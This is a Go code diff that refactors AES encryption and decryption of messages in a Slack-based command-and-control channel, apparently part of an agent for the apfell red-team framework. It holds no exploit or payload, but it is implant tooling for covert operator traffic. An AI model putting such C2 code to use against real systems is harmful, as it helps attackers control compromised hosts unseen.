@@ -357,7 +357,7 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 	m := structs.Message{}
 	log.Printf("Raw client message to apfell: %s", string(data))
 	if len(c.AesPreSharedKey()) != 0 {
-		m.Data = string(EncryptMessage(data, c.AesPreSharedKey()))
+		m.Data = string(c.encryptMessage(data))
 	} else {
 		m.Data = string(data)
 	}
@@ -495,10 +495,21 @@ func (c *C2Slack) sendData(msgType int, idType int, id string, tag string, data 
 	}
 
 	if len(c.AesPreSharedKey()) != 0 && c.ExchangingKeys != true {
-		dec := DecryptMessage([]byte(respMsg.Data), c.AesPreSharedKey())
+		dec := c.decryptMessage([]byte(respMsg.Data))
 		log.Printf("Decrypted response from apfell: %s", string(dec))
 		return dec
 	}
 
 	return []byte(respMsg.Data)
+}
+
+func (c *C2Slack) encryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.AesPreSharedKey())
+	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
+}
+
+func (c *C2Slack) decryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.AesPreSharedKey())
+	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
+	return crypto.AesDecrypt(key, decMsg)
 }
